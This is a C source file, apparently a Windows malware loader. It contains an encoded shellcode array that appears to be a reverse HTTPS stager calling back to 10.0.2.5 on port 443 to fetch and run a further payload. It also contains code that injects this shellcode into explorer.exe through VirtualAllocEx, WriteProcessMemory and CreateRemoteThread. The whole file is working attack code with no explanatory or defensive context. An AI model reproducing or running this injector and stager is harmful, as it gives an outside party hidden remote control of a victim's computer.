#include <stdio.h>
#include <Windows.h>
#include <TlHelp32.h>

unsigned char buf[] =
"\xfc\x48\x83\xe4\xf0\xe8\xcc\x00\x00\x00\x41\x51\x41\x50"
"\x52\x48\x31\xd2\x65\x48\x8b\x52\x60\x51\x48\x8b\x52\x18"
"\x48\x8b\x52\x20\x56\x4d\x31\xc9\x48\x8b\x72\x50\x48\x0f"
"\xb7\x4a\x4a\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
"\x20\x8b\x42\x3c\x48\x01\xd0\x66\x81\x78\x18\x0b\x02\x0f"
"\x85\x72\x00\x00\x00\x8b\x80\x88\x00\x00\x00\x48\x85\xc0"
"\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40\x20\x49"
"\x01\xd0\xe3\x56\x48\xff\xc9\x4d\x31\xc9\x41\x8b\x34\x88"
"\x48\x01\xd6\x48\x31\xc0\x41\xc1\xc9\x0d\xac\x41\x01\xc1"
"\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1\x75\xd8"
"\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c\x48\x44"
"\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x41\x58\x41\x58"
"\x48\x01\xd0\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a\x48\x83"
"\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b\x12\xe9"
"\x4b\xff\xff\xff\x5d\x48\x31\xdb\x53\x49\xbe\x77\x69\x6e"
"\x69\x6e\x65\x74\x00\x41\x56\x48\x89\xe1\x49\xc7\xc2\x4c"
"\x77\x26\x07\xff\xd5\x53\x53\x48\x89\xe1\x53\x5a\x4d\x31"
"\xc0\x4d\x31\xc9\x53\x53\x49\xba\x3a\x56\x79\xa7\x00\x00"
"\x00\x00\xff\xd5\xe8\x09\x00\x00\x00\x31\x30\x2e\x30\x2e"
"\x32\x2e\x35\x00\x5a\x48\x89\xc1\x49\xc7\xc0\xbb\x01\x00"
"\x00\x4d\x31\xc9\x53\x53\x6a\x03\x53\x49\xba\x57\x89\x9f"
"\xc6\x00\x00\x00\x00\xff\xd5\xe8\x1f\x00\x00\x00\x2f\x38"
"\x2d\x59\x54\x6d\x7a\x44\x32\x47\x73\x6c\x35\x59\x33\x68"
"\x68\x48\x47\x32\x57\x65\x67\x50\x56\x64\x7a\x49\x35\x50"
"\x00\x48\x89\xc1\x53\x5a\x41\x58\x4d\x31\xc9\x53\x48\xb8"
"\x00\x32\xa8\x84\x00\x00\x00\x00\x50\x53\x53\x49\xc7\xc2"
"\xeb\x55\x2e\x3b\xff\xd5\x48\x89\xc6\x6a\x0a\x5f\x48\x89"
"\xf1\x6a\x1f\x5a\x52\x68\x80\x33\x00\x00\x49\x89\xe0\x6a"
"\x04\x41\x59\x49\xba\x75\x46\x9e\x86\x00\x00\x00\x00\xff"
"\xd5\x4d\x31\xc0\x53\x5a\x48\x89\xf1\x4d\x31\xc9\x4d\x31"
"\xc9\x53\x53\x49\xc7\xc2\x2d\x06\x18\x7b\xff\xd5\x85\xc0"
"\x75\x1f\x48\xc7\xc1\x88\x13\x00\x00\x49\xba\x44\xf0\x35"
"\xe0\x00\x00\x00\x00\xff\xd5\x48\xff\xcf\x74\x02\xeb\xaa"
"\xe8\x55\x00\x00\x00\x53\x59\x6a\x40\x5a\x49\x89\xd1\xc1"
"\xe2\x10\x49\xc7\xc0\x00\x10\x00\x00\x49\xba\x58\xa4\x53"
"\xe5\x00\x00\x00\x00\xff\xd5\x48\x93\x53\x53\x48\x89\xe7"
"\x48\x89\xf1\x48\x89\xda\x49\xc7\xc0\x00\x20\x00\x00\x49"
"\x89\xf9\x49\xba\x12\x96\x89\xe2\x00\x00\x00\x00\xff\xd5"
"\x48\x83\xc4\x20\x85\xc0\x74\xb2\x66\x8b\x07\x48\x01\xc3"
"\x85\xc0\x75\xd2\x58\xc3\x58\x6a\x00\x59\x49\xc7\xc2\xf0"
"\xb5\xa2\x56\xff\xd5";


DWORD getProcessByName(const WCHAR* name)
{
    PROCESSENTRY32W entry;
    entry.dwSize = sizeof(PROCESSENTRY32W);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (Process32First(snapshot, &entry))
    {
        while (Process32Next(snapshot, &entry))
        {
            if (lstrcmpW(entry.szExeFile, name) == 0)
                return entry.th32ProcessID;

        }
    }
    return 0;
}


int main() {

    const WCHAR* process_name = L"explorer.exe";
    LPVOID baseAddress = 0;
    // Get the pid
    DWORD pid = getProcessByName(process_name);

    HANDLE ph = OpenProcess(PROCESS_ALL_ACCESS, FALSE, pid);

    LPVOID exec_mem = VirtualAllocEx(ph, baseAddress, sizeof(buf), MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);

    WriteProcessMemory(ph, exec_mem, &buf, sizeof(buf), 0);

    CreateRemoteThread(ph, 0, 0, (LPTHREAD_START_ROUTINE)exec_mem, 0, 0, 0);
}
